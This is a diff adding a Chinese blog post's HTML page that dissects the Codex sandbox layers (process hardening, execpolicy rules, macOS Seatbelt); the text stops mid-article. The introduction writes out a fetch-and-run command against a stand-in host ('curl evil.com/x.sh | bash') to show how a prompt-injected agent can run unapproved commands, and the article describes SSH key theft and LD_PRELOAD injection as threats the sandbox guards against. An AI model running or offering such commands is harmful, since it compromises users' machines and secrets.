@@ -1,0 +1,596 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="dark">
+  <head>
+
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#050b18">
+<meta name="color-scheme" content="dark light">
+<title>把 AI 关进笼子里：Codex Sandbox 全景拆解 | Leslie Zhang</title>
+<meta name="description" content="构建面向真实世界的 Agent 系统，也记录技术、行动与反馈如何改变理解。">
+<meta name="author" content="Leslie Zhang">
+<link rel="canonical" href="https://leslieaibin.github.io/2026/05/09/attention-field/%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3/">
+<link rel="icon" href="/imgs/01.jpg">
+<link rel="alternate" type="application/atom+xml" title="Leslie Zhang" href="/atom.xml">
+<meta property="og:type" content="article">
+<meta property="og:title" content="把 AI 关进笼子里：Codex Sandbox 全景拆解 | Leslie Zhang">
+<meta property="og:description" content="构建面向真实世界的 Agent 系统，也记录技术、行动与反馈如何改变理解。">
+<meta property="og:url" content="https://leslieaibin.github.io/2026/05/09/attention-field/%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3/">
+<meta property="og:image" content="https://leslieaibin.github.io/2026/05/09/attention-field/%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3/illustrations/C1-%E4%BA%94%E5%B1%82%E6%B4%8B%E8%91%B1%E6%80%BB%E8%A7%88.webp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="把 AI 关进笼子里：Codex Sandbox 全景拆解 | Leslie Zhang">
+<meta name="twitter:description" content="构建面向真实世界的 Agent 系统，也记录技术、行动与反馈如何改变理解。">
+<meta name="twitter:image" content="https://leslieaibin.github.io/2026/05/09/attention-field/%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3/illustrations/C1-%E4%BA%94%E5%B1%82%E6%B4%8B%E8%91%B1%E6%80%BB%E8%A7%88.webp">
+<script>
+  (function () {
+    var saved = localStorage.getItem('orbital-theme');
+    var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+    document.documentElement.dataset.theme = theme;
+  })();
+</script>
+<link rel="stylesheet" href="/css/orbital.css">
+<meta name="generator" content="Hexo 5.2.0"></head>
+  <body class="page-post">
+    <a class="skip-link" href="#main-content">跳到主要内容</a>
+    <div class="reading-progress" data-reading-progress></div>
+    <header class="site-header" data-header>
+  <div class="nav-shell">
+    <a class="brand" href="/" aria-label="返回首页">
+      <span class="brand-mark" aria-hidden="true"><img src="/images/brand/leslie-mythos-avatar.webp" alt="" width="512" height="512"></span>
+      <span class="brand-copy">
+        <strong>LESLIE</strong>
+        <small>REAL-WORLD AGENTS</small>
+      </span>
+    </a>
+
+    <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="main-nav" data-nav-toggle>
+      <span></span><span></span>
+      <span class="sr-only">打开导航</span>
+    </button>
+
+    <nav class="main-nav" id="main-nav" aria-label="主导航" data-nav>
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/writing/" class="">写作</a>
+      
+        <a href="/projects/" class="">项目</a>
+      
+        <a href="/about/" class="">关于</a>
+      
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换明暗主题">
+        <span class="theme-toggle__sun" aria-hidden="true">☼</span>
+        <span class="theme-toggle__moon" aria-hidden="true">◐</span>
+      </button>
+      <button class="ask-nav" type="button" data-ask-open>ASK LESLIE</button>
+    </nav>
+  </div>
+</header>
+
+    <main id="main-content"><article class="post-shell">
+  <header class="post-hero shell">
+    <a class="post-back" href="/writing/">← 返回写作</a>
+    <div class="post-hero__meta">
+      <time datetime="2026-05-09">2026 年 05 月 09 日</time>
+      <span>20 分钟阅读</span>
+    </div>
+    <h1>把 AI 关进笼子里：Codex Sandbox 全景拆解</h1>
+    
+    <div class="chip-row"><a href="/tags/Codex/">Codex</a><a href="/tags/LLM-Agent/">LLM-Agent</a><a href="/tags/Sandbox/">Sandbox</a><a href="/tags/Security/">Security</a><a href="/tags/Bubblewrap/">Bubblewrap</a><a href="/tags/Seatbelt/">Seatbelt</a><a href="/tags/Seccomp/">Seccomp</a><a href="/tags/Landlock/">Landlock</a><a href="/tags/AppContainer/">AppContainer</a></div>
+  </header>
+
+  <div class="post-cover shell"><img src="/2026/05/09/attention-field/%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3/illustrations/C1-%E4%BA%94%E5%B1%82%E6%B4%8B%E8%91%B1%E6%80%BB%E8%A7%88.webp" alt="把 AI 关进笼子里：Codex Sandbox 全景拆解"></div>
+
+  <div class="post-layout shell">
+    <aside class="post-toc" aria-label="文章目录">
+      <span class="aside-title">目录</span>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-text">引言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%AF%B4%E6%B8%85%E6%A5%9A%EF%BC%9ASandbox-%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">先说清楚：Sandbox 到底是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%9A%E7%95%8C%E4%B8%89%E7%A7%8D%E5%BA%94%E5%AF%B9"><span class="toc-text">业界三种应对</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E8%A7%88%EF%BC%9A%E4%BA%94%E5%B1%82%E6%B4%8B%E8%91%B1"><span class="toc-text">总览：五层洋葱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E5%9B%BA%EF%BC%9A%E8%BF%98%E6%B2%A1%E8%BF%9B-main-%E5%B0%B1%E5%85%B3%E4%B8%8A%E7%9A%84%E5%87%A0%E6%89%87%E9%97%A8"><span class="toc-text">1. 进程加固：还没进 main() 就关上的几扇门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Execpolicy%EF%BC%9A%E5%91%BD%E4%BB%A4%E5%88%B0%E8%BE%BE-sandbox-%E4%B9%8B%E5%89%8D%E7%9A%84%E6%94%BF%E5%AE%A1"><span class="toc-text">2. Execpolicy：命令到达 sandbox 之前的政审</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-macOS-Seatbelt%EF%BC%9AApple-%E8%87%AA%E5%AE%B6%E7%9A%84%E7%AC%BC%E5%AD%90"><span class="toc-text">3. macOS Seatbelt：Apple 自家的笼子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Linux-Bubblewrap%EF%BC%9A%E7%94%A8-Linux-namespaces-%E6%8B%BC%E5%87%BA%E6%9D%A5%E7%9A%84%E7%AC%BC%E5%AD%90"><span class="toc-text">4. Linux Bubblewrap：用 Linux namespaces 拼出来的笼子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bubblewrap-%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1"><span class="toc-text">Bubblewrap 自己的安全防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Shell-%E5%86%85%E6%8B%A6%E6%88%AA%EF%BC%9A%E7%94%A8%E6%88%B7%E4%B8%BB%E5%8A%A8%E6%89%B9%E5%87%86%E7%9A%84%E3%80%8C%E8%B6%8A%E7%8B%B1%E3%80%8D"><span class="toc-text">5. Shell 内拦截：用户主动批准的「越狱」</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Windows%EF%BC%9A%E5%AE%8C%E5%85%A8%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E4%B8%80%E5%A5%97"><span class="toc-text">6. Windows：完全不一样的一套</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%87%A0%E4%B8%AA%E8%81%AA%E6%98%8E%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%86%B3%E7%AD%96"><span class="toc-text">7. 几个聪明的设计决策</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E6%80%BB%E7%BB%93%EF%BC%9A%E4%B8%80%E5%BC%A0%E8%A1%A8%E5%9B%9E%E9%A1%BE%EF%BC%8C%E5%8A%A0%E4%B8%8A%E5%87%A0%E4%B8%AA%E4%BA%8C%E5%BC%80%E6%96%B9%E5%90%91"><span class="toc-text">8. 总结：一张表回顾，加上几个二开方向</span></a></li></ol>
+    </aside>
+    <div class="article-content"><h1 id="把-AI-关进笼子里：Codex-Sandbox-全景拆解"><a href="#把-AI-关进笼子里：Codex-Sandbox-全景拆解" class="headerlink" title="把 AI 关进笼子里：Codex Sandbox 全景拆解"></a>把 AI 关进笼子里：Codex Sandbox 全景拆解</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>你让 Codex 帮你修个 bug。它读了几个文件，想了几秒，决定执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf node_modules &amp;&amp; pnpm install</span><br></pre></td></tr></table></figure>
+
+<p>它已经按下回车了，你才看到那行命令。</p>
+<p>这一秒钟，至少有十种东西可能出错。<code>rm</code> 把路径写错——比如多了个空格——就能把你的家目录端掉。<code>pnpm install</code> 顺手跑了某个恶意 postinstall 脚本，把 <code>~/.ssh/id_rsa</code> 上传到了境外服务器。模型被 prompt injection 了，前一秒还在改 React 组件，下一秒突然 <code>curl evil.com/x.sh | bash</code>。</p>
+<p><strong>让 LLM 自己在你电脑上跑命令，本质上是在邀请一个永远都没法 100% 信任的实习生进入生产服务器。</strong></p>
+<hr>
+<h2 id="先说清楚：Sandbox-到底是什么"><a href="#先说清楚：Sandbox-到底是什么" class="headerlink" title="先说清楚：Sandbox 到底是什么"></a>先说清楚：Sandbox 到底是什么</h2><p>如果你是第一次听 sandbox（中文译”沙箱”）这个词，先用一句话定义：</p>
+<blockquote>
+<p><strong>Sandbox 就是给一段你不完全信任的代码一套受限的执行环境，让它只能用你允许的资源、只能干你允许的事。坏事不是靠它自觉不做，而是环境本身让它做不出来。</strong></p>
+</blockquote>
+<p>这是一个非常老的安全概念，已经悄悄塞满了你身边几乎所有现代软件：</p>
+<table>
+<thead>
+<tr>
+<th>你在用的东西</th>
+<th>它的 sandbox 长什么样</th>
+<th>防的是什么风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Chrome 浏览器</strong></td>
+<td>每个 Tab 一个独立的渲染进程，进程被 OS 限制不能读你硬盘的任意文件</td>
+<td>一个网页有 0day 漏洞，最多只能搞到当前 Tab，不能拿到你其他网站的 cookie 或本地文件</td>
+</tr>
+<tr>
+<td><strong>iPhone App</strong></td>
+<td>每个 App 跑在自己的 Container 目录里，默认只能访问 <code>/Apps/&lt;bundle-id&gt;/</code> 下的文件</td>
+<td>一个 App 装上来不能偷另一个 App 的数据，更不能动系统文件</td>
+</tr>
+<tr>
+<td><strong>Docker 容器</strong></td>
+<td>进程跑在 Linux namespace 隔离里，文件系统、网络、PID 全部独立</td>
+<td>一个容器被攻破，不影响宿主机和其他容器</td>
+</tr>
+<tr>
+<td><strong>AWS Lambda</strong></td>
+<td>每次函数调用启动一个 Firecracker 微 VM，几毫秒后销毁</td>
+<td>函数里有恶意代码？影响半径 = 这一次调用</td>
+</tr>
+</tbody></table>
+<p>形式各异，思路完全一致：<strong>给定一个不完全信任的执行体，用 OS / 内核 / 硬件层面的隔离机制，把它的”能力”收窄到你能接受的范围</strong>。</p>
+<p>一个 sandbox 通常控制四类能力：</p>
+<table>
+<thead>
+<tr>
+<th>能力</th>
+<th>不控制会发生什么</th>
+<th>sandbox 怎么管</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>文件系统</strong></td>
+<td>程序读光你的 <code>~/.ssh/id_rsa</code>、删光你的 <code>~/Documents/</code></td>
+<td>默认全只读 / 全不可见，显式开放某些目录</td>
+</tr>
+<tr>
+<td><strong>网络</strong></td>
+<td>把你的代码、token、密钥往外发</td>
+<td>默认断网，显式允许某些域名/端口</td>
+</tr>
+<tr>
+<td><strong>进程</strong></td>
+<td>fork 出子进程做坏事、ptrace 别的进程偷数据</td>
+<td>限制 fork、禁 ptrace、新进程不能提权</td>
+</tr>
+<tr>
+<td><strong>系统调用 (syscall)</strong></td>
+<td>直接 <code>mount</code>、<code>reboot</code>、<code>kexec_load</code> 内核级搞事情</td>
+<td>用 seccomp / AppArmor 按 syscall 白名单拦截</td>
+</tr>
+</tbody></table>
+<p><strong>为什么 AI agent 时代 sandbox 突然变得格外重要？</strong> 因为 AI 是<strong>有史以来最不可信任的执行体</strong>：</p>
+<ul>
+<li>传统程序的行为是写死的，你 review 代码就能知道它会干什么</li>
+<li>AI 的行为是<strong>采样</strong>出来的，没人能保证下一秒不会因为某个奇怪的 prompt 跑出 <code>rm -rf /</code></li>
+<li>AI 还可能被<strong>prompt injection</strong>（攻击者把恶意指令藏进它读到的文档/网页），让它做你完全没批准的事</li>
+</ul>
+<p>传统软件的 sandbox 思路完全适用：<strong>不要相信 AI 守规矩，让环境本身阻止它做坏事</strong>。Codex 把这个思路做到了极致 —— 不是一道墙，是 5 道叠在一起的墙，任何一道都不假设自己是最后一道防线。</p>
+<hr>
+<h2 id="业界三种应对"><a href="#业界三种应对" class="headerlink" title="业界三种应对"></a>业界三种应对</h2><p>回到 AI agent 这件事上。让 AI 自己跑命令，业界目前处理的方式分三档：</p>
+<ul>
+<li><strong>Aider / Continue 等</strong>：让用户每条命令都人工 confirm。安全但慢。</li>
+<li><strong>Cursor Agent / Claude Code</strong>：默认大多数命令直接执行，靠 prompt + 用户警觉性。快但险。</li>
+<li><strong>OpenAI Codex</strong>：默认就把 AI 关在一个工业级 sandbox 里。AI 想干的事先过五道关，能过的才落地。</li>
+</ul>
+<p>第三种是这篇文章的主角。Codex 的 <code>codex-rs/</code> 里和 sandbox 相关的 crate 有 7 个，<strong>实现了 5 层防御</strong>（windows-sandbox-rs 是平台 sandbox 在 Windows 上的实现，bwrap 是 linux-sandbox 的兜底二进制）：</p>
+<table>
+<thead>
+<tr>
+<th>Crate</th>
+<th>干什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>process-hardening</code></td>
+<td>进程级加固，禁止 ptrace、core dump、<code>LD_PRELOAD</code> 注入</td>
+</tr>
+<tr>
+<td><code>execpolicy</code></td>
+<td>命令白名单引擎，Starlark DSL，allow / prompt / forbidden 三档</td>
+</tr>
+<tr>
+<td><code>sandboxing</code></td>
+<td>跨平台 sandbox 编排器，根据 OS 选择 seatbelt / bubblewrap / Windows</td>
+</tr>
+<tr>
+<td><code>linux-sandbox</code></td>
+<td>Linux 实现：bubblewrap + seccomp + namespaces</td>
+</tr>
+<tr>
+<td><code>bwrap</code></td>
+<td>内嵌的 bubblewrap 二进制，作为系统 bwrap 的兜底</td>
+</tr>
+<tr>
+<td><code>windows-sandbox-rs</code></td>
+<td>Windows 实现：AppContainer + RestrictedToken + WFP 防火墙</td>
+</tr>
+<tr>
+<td><code>shell-escalation</code></td>
+<td>shell 内 execve 拦截，给「用户主动批准的」命令开后门</td>
+</tr>
+</tbody></table>
+<p>这五层叠在一起像一个洋葱，每一层独立成立、合在一起做纵深防御。这篇文章把每一层拆开，告诉你它在防什么、怎么防、为什么是这样而不是那样。读完你会知道：当 AI 想 <code>rm -rf</code> 你的家目录时，到底是哪些代码在按住它的手。</p>
+<p><img src="illustrations/C1-%E4%BA%94%E5%B1%82%E6%B4%8B%E8%91%B1%E6%80%BB%E8%A7%88.webp" alt="Codex sandbox 五层防御洋葱总览"></p>
+<hr>
+<h2 id="总览：五层洋葱"><a href="#总览：五层洋葱" class="headerlink" title="总览：五层洋葱"></a>总览：五层洋葱</h2><p>把请求从「模型决定要跑某条命令」到「命令真正在 OS 上落地」的整条路径列出来：</p>
+<table>
+<thead>
+<tr>
+<th>顺序</th>
+<th>层</th>
+<th>拦截时机</th>
+<th>兜的是什么风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><strong>进程加固</strong></td>
+<td>Codex 进程启动前（pre-main）</td>
+<td>攻击者已经在你的机器上有同用户权限，想横向劫持 Codex 进程本身</td>
+</tr>
+<tr>
+<td>1</td>
+<td><strong>execpolicy 检查</strong></td>
+<td>命令到达 sandbox 之前</td>
+<td>已知危险命令（<code>rm -rf /</code>、<code>git push --force</code>）、未审计命令</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>平台 sandbox 进入</strong></td>
+<td>命令真正 fork 之前</td>
+<td>文件系统越权、网络外联、子进程 fork 提权</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>内核级隔离</strong></td>
+<td>进程已经在 sandbox 内运行</td>
+<td>利用 syscall 越狱（unshare、ptrace、mount）、namespace 逃逸</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>shell 内拦截</strong></td>
+<td>sandbox 内的 shell fork 子进程时</td>
+<td>用户主动批准某条命令需要「跳出 sandbox」执行</td>
+</tr>
+</tbody></table>
+<p>接下来逐层拆开。</p>
+<hr>
+<h2 id="1-进程加固：还没进-main-就关上的几扇门"><a href="#1-进程加固：还没进-main-就关上的几扇门" class="headerlink" title="1. 进程加固：还没进 main() 就关上的几扇门"></a>1. 进程加固：还没进 main() 就关上的几扇门</h2><p>最容易被忽视的一层，也是最先生效的一层。</p>
+<p><code>codex-rs/process-hardening/src/lib.rs</code> 里有个函数叫 <code>pre_main_hardening()</code>，通过 <code>#[ctor::ctor]</code> 这个属性宏（<strong>ctor</strong>，constructor 的缩写，让函数在 <code>main()</code> 之前被自动调用）注册成构造器。Codex 进程一加载，这个函数就先跑。</p>
+<p>它干四件事（下面代码块是 Linux 版的精选三件，macOS 版还会多做一件清空 <code>DYLD_*</code> 和 <code>MallocStackLogging</code>）：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// codex-rs/process-hardening/src/lib.rs:45</span></span><br><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">pre_main_hardening_linux</span></span>() &#123;</span><br><span class="line">    <span class="comment">// 1. 关闭 ptrace 附加和 core dump</span></span><br><span class="line">    libc::prctl(libc::PR_SET_DUMPABLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 2. 把 core 文件大小上限设为 0</span></span><br><span class="line">    set_core_file_size_limit_to_zero();</span><br><span class="line">    <span class="comment">// 3. 清掉所有 LD_* 环境变量</span></span><br><span class="line">    remove_env_vars_with_prefix(<span class="string">b&quot;LD_&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>每一个都对应一类攻击。</p>
+<p><img src="illustrations/C2-%E8%BF%9B%E7%A8%8B%E5%8A%A0%E5%9B%BA4%E4%BB%B6%E4%BA%8B.webp" alt="Codex 进程加固的 4 件事，分别对应 4 类典型攻击场景"></p>
+<p>**<code>PR_SET_DUMPABLE = 0</code>**（Linux）/ **<code>ptrace(PT_DENY_ATTACH)</code>**（macOS）。把当前进程标记为「不可调试」。同一用户下的其他进程不能用 <code>gdb</code>、<code>strace</code>、<code>lldb</code> 附加上来读 Codex 的内存。这堵的是：你机器上已经被一个低权限的恶意进程（比如某个 npm 包的恶意脚本）感染了，它会扫同 UID 下的进程，找到 Codex 之后挂上 ptrace 抓你和 OpenAI API 的会话 token。设了 <code>PR_SET_DUMPABLE = 0</code> 之后，ptrace 直接 <code>EPERM</code> 失败。</p>
+<p><strong><code>RLIMIT_CORE = 0</code>**（所有 Unix）。把 core dump（</strong>core dump**，进程崩溃时操作系统把内存快照写到磁盘的文件）大小硬限制为 0。Codex 在内存里持有 API key、对话历史、你正在编辑的文件内容。它如果不幸 panic 了，没有 core dump 意味着这些敏感信息不会被写到 <code>/var/lib/systemd/coredump/</code>、<code>~/Library/Logs/DiagnosticReports/</code> 这种地方等着别的进程或者系统级日志收集器读。</p>
+<p><strong>清空 <code>LD_*</code> 和 <code>DYLD_*</code>**。</strong><code>LD_PRELOAD</code>**（Linux）和 **<code>DYLD_INSERT_LIBRARIES</code>**（macOS）是动态链接器（dynamic linker，加载 .so/.dylib 共享库的运行时组件）的环境变量，可以让任意 .so 在程序的所有库之前被加载。攻击者最经典的提权路径之一：往 <code>LD_PRELOAD</code> 里塞一个恶意 .so，里面 hook 了 <code>libc</code> 的 <code>getenv</code>、<code>open</code>、<code>write</code>，所有读环境变量、读文件、写日志的调用都先进它的代码。Codex 在 main() 之前清空所有 <code>LD_</code> 开头的环境变量，等于关掉这条注入路径。</p>
+<p>**清空 <code>MallocStackLogging</code>**（macOS 独有）。这个变量开了之后会让 macOS 的 malloc 把所有堆栈分配的调用栈记到一个文件里。在 TUI 这种持续刷屏的场景下，会把 stack log 喷到终端里污染 UI（<a target="_blank" rel="noopener" href="https://github.com/openai/codex/issues/11555">issue #11555</a>）。这条不是安全问题，是体验问题。但它和上面那些挤在同一个函数里，因为它们都属于「进程一启动就该处理掉的环境噪声」。</p>
+<p>这一层的特点是：<strong>只防同 UID 下的攻击</strong>。一个有 root 的攻击者照样能绕过 ptrace 限制、读 core dump、修改环境变量。Codex 不假设它是在被 root 攻击的环境里运行——那已经是另一个量级的威胁模型了，谁也救不了你。</p>
+<hr>
+<h2 id="2-Execpolicy：命令到达-sandbox-之前的政审"><a href="#2-Execpolicy：命令到达-sandbox-之前的政审" class="headerlink" title="2. Execpolicy：命令到达 sandbox 之前的政审"></a>2. Execpolicy：命令到达 sandbox 之前的政审</h2><p>进程加固只是开场。真正决定「AI 能不能跑这条命令」的是 <code>execpolicy</code> 这个 crate。</p>
+<p>它本质是一个<strong>策略引擎</strong>（policy engine，输入命令、输出 allow/prompt/forbidden 决定的纯函数模块）。规则用 <strong>Starlark</strong> 写——一种 Python 风格的配置 DSL（Bazel、Buck 都在用），故意去掉了循环、可变全局状态和动态特性，因此规则文件可以被安全地解析、缓存、并行评估。</p>
+<p>一条规则长这样：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># codex-rs/execpolicy/examples/example.codexpolicy</span></span><br><span class="line">prefix_rule(</span><br><span class="line">    pattern = [<span class="string">&quot;git&quot;</span>, <span class="string">&quot;reset&quot;</span>, <span class="string">&quot;--hard&quot;</span>],</span><br><span class="line">    decision = <span class="string">&quot;forbidden&quot;</span>,</span><br><span class="line">    justification = <span class="string">&quot;destructive operation&quot;</span>,</span><br><span class="line">    match = [</span><br><span class="line">        [<span class="string">&quot;git&quot;</span>, <span class="string">&quot;reset&quot;</span>, <span class="string">&quot;--hard&quot;</span>],</span><br><span class="line">    ],</span><br><span class="line">    not_match = [</span><br><span class="line">        [<span class="string">&quot;git&quot;</span>, <span class="string">&quot;reset&quot;</span>, <span class="string">&quot;--keep&quot;</span>],</span><br><span class="line">        <span class="string">&quot;git reset --merge&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>pattern</code></strong> 是一个有序的 token 数组。命令传进来之后被 shlex 切成 token 数组，按顺序匹配。<code>pattern</code> 里的元素也可以是数组，表示「这一位允许多选一」（比如 <code>[&quot;cmd&quot;, [&quot;alt1&quot;, &quot;alt2&quot;]]</code>）。</p>
+<p><strong><code>decision</code></strong> 三档：</p>
+<ul>
+<li><code>allow</code>：放行</li>
+<li><code>prompt</code>：弹给用户人工确认</li>
+<li><code>forbidden</code>：直接拒，并把 <code>justification</code> 字段作为拒绝理由展示</li>
+</ul>
+<p><strong><code>match</code> / <code>not_match</code></strong> 是规则自带的「单元测试」。规则在加载时就会跑这些 example，确保你写的规则真的能匹配你想匹配的命令、不会误伤想放过的命令。这是一个非常聪明的设计——大部分策略系统的规则只能上线之后靠用户翻车来验证，Codex 在规则文件里就强制你写 example。</p>
+<p>匹配语义有两个细节值得说。</p>
+<p><strong>严格度合并</strong>。一条命令可能匹中多条规则，最终决定取最严格的：<code>forbidden &gt; prompt &gt; allow</code>。这意味着你可以叠加规则：写一条 <code>prefix_rule(pattern=[&quot;git&quot;], decision=&quot;allow&quot;)</code> 给 git 整体放行，再单独写 <code>prefix_rule(pattern=[&quot;git&quot;, &quot;reset&quot;, &quot;--hard&quot;], decision=&quot;forbidden&quot;)</code> 拦截危险子命令——<code>git reset --hard</code> 同时命中两条，最严的 forbidden 生效。注意：如果你<strong>没</strong>显式写 <code>git</code> 的 allow 规则，那”未匹配”≠”放行”，效果取决于你的 Codex 配置（有些场景下未匹配会触发 prompt）。</p>
+<p><strong>Host executable 解析</strong>。命令里的程序名是 <code>git</code> 还是 <code>/usr/bin/git</code> 还是 <code>/opt/homebrew/bin/git</code>，匹配语义不一样。默认情况下，<code>/usr/bin/git status</code> 只匹配 <code>pattern = [&quot;/usr/bin/git&quot;, ...]</code> 的规则，而 <code>git status</code> 只匹配 <code>pattern = [&quot;git&quot;, ...]</code> 的规则。开了 <code>--resolve-host-executables</code> 之后，绝对路径会回退到 basename 规则。如果你显式声明了 <code>host_executable(name=&quot;git&quot;, paths=[&quot;/opt/homebrew/bin/git&quot;, &quot;/usr/bin/git&quot;])</code>，那么只有这两个绝对路径会被允许回退到 <code>git</code> 的 basename 规则——这是为了<strong>防止 PATH 注入</strong>：<code>/tmp/git</code> 即使被打到 PATH 第一位也不会被当成你信任的 <code>git</code>。</p>
+<p>execpolicy 是一个独立的 binary（<code>codex execpolicy check --rules path/to/policy git status</code>），返回 JSON。这意味着你可以把它作为单独的 CLI 工具集成进任何 CI / 审计系统，不一定得跑 Codex。</p>
+<p>这一层的核心价值是<strong>审计可读</strong>。AI 想跑什么、被允许还是被拒绝，全是可声明、可 review、可 diff 的文本规则。出事了能复盘。</p>
+<hr>
+<h2 id="3-macOS-Seatbelt：Apple-自家的笼子"><a href="#3-macOS-Seatbelt：Apple-自家的笼子" class="headerlink" title="3. macOS Seatbelt：Apple 自家的笼子"></a>3. macOS Seatbelt：Apple 自家的笼子</h2><p>如果 execpolicy 放行了，命令进入平台 sandbox。先讲 macOS。</p>
+<p>macOS 的 sandbox 机制叫 <strong>Seatbelt</strong>（Apple 自家也没起特别好的中文名，行业里偶尔叫”安全带”），上层 CLI 是 <code>/usr/bin/sandbox-exec</code>，下层是 Apple 内核的 <code>Sandbox.kext</code>。Sandbox 策略用 <strong>SBPL</strong>（Sandbox Profile Language，Apple 没有官方文档的 Scheme 方言）写。Codex 在 <code>codex-rs/sandboxing/src/seatbelt_base_policy.sbpl</code> 里维护着一份基础策略，源头明确标注「inspired by Chrome’s sandbox policy」——抄的是 Chrome 渲染进程的沙箱配置。</p>
+<p><img src="illustrations/C3-macOS-Seatbelt%E6%9E%B6%E6%9E%84.webp" alt="macOS Seatbelt 架构：Codex → /usr/bin/sandbox-exec → SBPL 策略 → Sandbox.kext 内核"></p>
+<p>策略文件第一行非常关键：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">version</span> <span class="number">1</span>)</span><br><span class="line">(<span class="name">deny</span> default)</span><br></pre></td></tr></table></figure>
+
+<p><strong>默认拒一切</strong>。剩下几百行全是「允许……」的白名单。这是和 iptables 防火墙完全一样的设计哲学：default-deny 比 default-allow 安全一个数量级，因为前者的失误是「合法操作被拒」（用户立刻发现并修），后者的失误是「危险操作被放过」（可能很久才被发现）。</p>
+<p>被显式允许的事情非常窄：</p>
+<ul>
+<li>进程：<code>process-exec</code>、<code>process-fork</code>，子进程继承同样的 sandbox</li>
+<li>sysctl 读取：只允许查 CPU 信息（<code>hw.ncpu</code>、<code>hw.memsize</code> 等）和 OS 版本</li>
+<li>IOKit：只允许 <code>RootDomainUserClient</code></li>
+<li>mach 服务：只允许 <code>opendirectoryd</code>（查 user info）、<code>cfprefsd</code>（读 user preferences）</li>
+<li>pseudo-tty：开 <code>pty</code> 让交互 shell 能用</li>
+<li><code>/dev/null</code> 写入</li>
+</ul>
+<p><strong>网络默认完全禁止</strong>。需要联网时，再叠加一份 <code>seatbelt_network_policy.sbpl</code>，里面也只放行了「为了让 TLS 工作」的最小集合：与 SecurityServer 通信验证证书、与 SystemConfiguration 通信查 DNS 配置。</p>
